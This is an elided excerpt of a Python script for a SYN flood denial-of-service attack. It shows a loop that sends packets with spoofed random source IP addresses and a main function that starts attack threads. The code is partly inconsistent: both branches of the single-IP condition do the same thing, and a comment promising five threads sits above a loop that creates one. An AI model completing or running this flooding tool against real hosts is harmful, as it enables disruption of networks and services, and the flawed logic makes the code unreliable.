...
def syn_dos(dest_ip, dest_port, cnt, single_ip, same_subnet):
    global pkt
    total = 0
    net = get_net()

    print("Attacking from multiple IPs" if not single_ip else "Attacking from a single IP")

    while total < cnt or cnt == -1:
        # Generate spoofed source IP
        if single_ip:
            src_ip = rand_ip(net) if same_subnet else rand_ip('0.0.0.0/0')
        else:
            src_ip = rand_ip(net) if same_subnet else rand_ip('0.0.0.0/0')  # New IP for every packet
        ...
        with lock:
            ...
            print(f"Packet {total}: Src IP={ip_pkt.src}", end="\r")
...
def main():  # Main function to initiate the SYN flood attack
    ...
    threads = []
    for _ in range(1):  # Create 5 threads for multi-threading
